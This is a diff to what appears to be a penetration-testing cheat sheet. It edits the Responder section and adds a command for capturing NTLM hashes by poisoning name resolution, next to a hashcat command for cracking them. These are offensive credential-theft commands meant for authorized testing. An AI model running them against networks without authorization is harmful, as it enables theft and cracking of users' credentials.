@@ -3628,8 +3628,11 @@ PromptOnSecureDesktop REG_DWORD 0x1
 
 ## RESPONDER
 ```bash
-start responder in analyze mode (capture hashes)
+start responder in analyze mode (monitor traffic)
 responder -I interface_here -A
+
+capture hashes
+responder -I interface_here
 
 # crack NTLM hash captured with responder
 hashcat -m 5600 /path/to/hash /path/to/wordlist
